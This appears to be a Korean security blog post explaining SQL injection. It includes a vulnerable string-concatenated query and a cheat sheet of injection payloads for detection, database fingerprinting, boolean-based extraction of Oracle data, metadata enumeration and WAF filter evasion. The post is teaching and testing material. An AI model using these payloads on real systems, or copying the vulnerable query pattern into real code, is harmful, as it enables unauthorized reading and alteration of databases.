---
title: "SQL 인젝션 (SQL Injection)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, SQL Injection]
tags: [sql-injection, web, database]
description: "입력이 SQL 문법으로 해석되는 SQL 인젝션의 개념과, 탐지·DB 식별·불리언·에러·시간 기반 확인부터 WAF 우회까지의 공격 구문을 정리합니다."
mermaid: true
---

> SQL 인젝션은 사용자 입력이 SQL 쿼리의 문법으로 해석되는 취약점이다. 공격자는 인증 우회, 데이터 열람·변조, 경우에 따라 명령 실행까지 할 수 있다.

## 개념

애플리케이션이 쿼리를 **문자열 이어붙이기**로 만들면, DB는 개발자가 쓴 문법과 사용자가 넣은 값을 구분하지 못한다.

```python
sql = "SELECT * FROM users WHERE name = '" + name + "'"
```

`name`에 `' OR '1'='1`을 넣으면 조건이 항상 참이 된다. 따옴표 하나가 문자열 리터럴을 닫는 순간, 그 뒤는 데이터가 아니라 SQL 코드가 된다. 숫자 파라미터는 따옴표조차 필요 없다.

확인 방법은 쿼리가 문법적으로 깨지는지를 본 뒤, 결과를 어떻게 끌어내느냐에 따라 나뉜다.

- **에러 기반**: DB 오류 메시지가 그대로 노출될 때, 오류 안으로 데이터를 끌어낸다.
- **불리언(블라인드)**: 참/거짓에 따라 응답이 달라질 때, 한 글자씩 판별한다.
- **시간 기반(블라인드)**: 응답 차이가 없을 때, 참일 때만 지연시켜 판별한다.

## 공격·우회 구문

DB·테이블은 일반 이름으로, 대상은 플레이스홀더로 둔다. 점검은 허가된 범위에서만 한다.

### 탐지

```
search=test'          # 싱글쿼터 삽입 후 오류/변화
search=test' --       # 주석으로 뒤 잘라내기
search=test''         # 쿼터 2개로 정상 복귀 여부
search=test and 1=1   # 쿼터 없이 불리언
search=test or 1
```

`order by` 지점 의심:

```
order=1
order=name,1
order=name, CASE WHEN (1=1) THEN 1 ELSE (SELECT 1/0) END   # 에러 기반 판별
```

시간 지연으로 주입점 확인:

```
/fetch?id=3|sleep(3)
```

### DB 종류 식별

```sql
and 1=(select 1 from dual)        -- Oracle
and LEN('test')=4                 -- MSSQL
and 1=(select 1)                  -- MSSQL
```

### 불리언 기반 추출 (Oracle 예)

```
'+and+(select length(user) from dual)>1          -- 길이 판별
'+and+substr((select user from dual),1,1)='A'    -- 한 글자씩
```

### 메타데이터 열거 (Oracle 예)

```sql
select table_name from all_tables
select column_name from all_tab_columns where table_name='TABLE_NAME'
```

### WAF·필터 우회 발상

- 주석으로 공백 대체: `/**/`, `--`, `#`
- 대소문자 혼합: `SeLeCT`
- 인코딩: URL 인코딩, 이중 URL 인코딩
- 동치 표현: 공백 → `+`, 괄호·연산자 변형

> 자동화된 대량 추출(sqlmap 등)은 원리를 이해한 뒤 보조 도구로만 쓴다. 이 글은 수동 확인 기준으로 정리한다.

## 참고 자료

- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
